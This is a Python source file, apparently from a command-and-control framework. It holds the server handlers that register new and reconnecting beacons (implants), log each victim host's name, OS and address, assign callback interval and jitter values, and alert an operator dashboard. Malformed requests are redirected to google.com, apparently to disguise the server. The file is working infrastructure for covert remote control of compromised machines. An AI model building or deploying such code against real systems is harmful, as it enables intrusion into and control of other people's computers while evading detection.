# beacon_server/handlers/connection_handler.py

import time
import uuid
import zlib
import json
from http.server import BaseHTTPRequestHandler

from Modules.global_objects import config, logger
from Modules.beacon.beacon import add_beacon_list

from Modules.beacon.beacon_server.socket_manager import socketio
from Modules.beacon.beacon_server.utils import process_request_data


def handle_connection_request(handler: BaseHTTPRequestHandler, match: dict):
    """Handles the initial connection request from a new beacon."""
    logger.info(f"Connection request from {handler.path}")

    content_len = int(handler.headers.get('Content-Length', 0))
    raw_data = handler.rfile.read(content_len)

    data, error = process_request_data(raw_data)
    if error:
        handler.send_response(400)
        handler.end_headers()
        return

    if data and 'name' in data and 'os' in data and 'address' in data:
        userID = str(uuid.uuid4())
        logger.info(f"New connection from {data['name']} on {data['os']} at {data['address']} with UUID {userID}")

        add_beacon_list(
            userID, data['address'], data['name'], data['os'], time.asctime(),
            config['beacon']["interval"], config['beacon']['jitter'], config
        )

        socketio.emit('new_connection', {
            'uuid': userID, 'name': data['name'], 'os': data['os'],
            'address': data['address'], "interval": config['beacon']["interval"],
            "jitter": config['beacon']['jitter']
        })

        response_body = json.dumps({
            "timer": config['beacon']["interval"],
            "uuid": userID, "jitter": config['beacon']['jitter']
        }).encode('utf-8')

        handler.send_response(200)
        handler.send_header('Content-Type', 'application/json')
        handler.send_header('Content-Length', str(len(response_body)))
        handler.end_headers()
        handler.wfile.write(response_body)
    else:
        logger.error("Invalid data format in connection request, redirecting.")
        handler.send_response(302)
        handler.send_header('Location', 'https://www.google.com')
        handler.end_headers()


def handle_reconnect(handler: BaseHTTPRequestHandler, match: dict):
    """Handles a reconnection request."""
    logger.info(f"Reconnection request from {handler.path}")

    content_len = int(handler.headers.get('Content-Length', 0))
    raw_data = handler.rfile.read(content_len)

    try:
        decompressed_data = zlib.decompress(raw_data)
        data = json.loads(decompressed_data.decode('utf-8'))
    except (zlib.error, json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to process reconnection data: {e}")
        handler.send_response(400)
        handler.end_headers()
        return

    required_keys = ["name", "os", "address", "id", "timer", "jitter"]
    if all(key in data for key in required_keys):
        add_beacon_list(
            data['id'], data['address'], data['name'], data['os'], time.asctime(),
            float(data['timer']), float(data['jitter']), config
        )
        logger.info(f"Beacon list updated for reconnection ID: {data['id']}")
        response_body = json.dumps({"x": True}).encode('utf-8')
        handler.send_response(200)
        handler.send_header('Content-Type', 'application/json')
        handler.send_header('Content-Length', str(len(response_body)))
        handler.end_headers()
        handler.wfile.write(response_body)
    else:
        logger.error("Invalid data format in reconnection request.")
        handler.send_response(404)
        handler.end_headers()
